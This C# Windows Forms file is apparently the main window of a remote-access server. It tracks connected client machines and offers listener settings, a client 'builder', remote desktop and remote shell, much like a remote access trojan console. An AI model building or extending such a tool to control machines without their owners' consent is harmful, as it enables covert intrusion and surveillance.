using Serveur.Controllers;
using Serveur.Controllers.Server;
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmMain : Form
    {
        private FrmMainController _frmMainController;
        private FrmListenerController _frmListenerController;
        private List<ClientMosaic> _connectedClients;

        private int selectedRow;

        private readonly object _clientsLock = new object();


        public FrmMain()
        {
            InitializeComponent();
            _connectedClients = new List<ClientMosaic>();
            _frmMainController = new FrmMainController();
            _frmListenerController = new FrmListenerController();
            ClientMosaic.RemplirDGV += dgvUpdater;
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmListener(_frmListenerController);
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmBuilder();
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmRdp(getClient());
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmRms(getClient());
        }

        


        // ADD CLIENT INTO DATAGRIDVIEW
        public void dgvUpdater(ClientMosaic client)
        {
            Invoke(new Action<ClientMosaic>(DgvUpdater), client);
        }
        public void DgvUpdater(ClientMosaic client)
        {
            if (client != null)
            {
                _connectedClients.Add(client);
                DgvMain.Rows.Add(client.endPoint.Port, client.endPoint.ToString().Split(':')[0], client.value.name,
                    client.value.accountType, client.value.country, client.value.operatingSystem, "Connected");
            }
        }

        //GET CLIENT FROM DATAGRIDVIEW
        public ClientMosaic getClient()
        {
            foreach (ClientMosaic c in _connectedClients)
            {
                if (int.Parse(DgvMain.Rows[selectedRow].Cells[0].Value.ToString()) == c.endPoint.Port)
                    return c;
            }
            return null;
        }

        //EVENTS
        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            lock (_clientsLock)
            {
                while (_connectedClients.Count != 0)
                {
                    try
                    {
                        _connectedClients[0].disconnect();
                        _connectedClients.RemoveAt(0);
                    }
                    catch
                    {
                    }
                }
            }
        }

        private void DgvMain_CellClick(object sender, DataGridViewCellEventArgs e)
        {
            selectedRow = e.RowIndex;
        }
    }
}
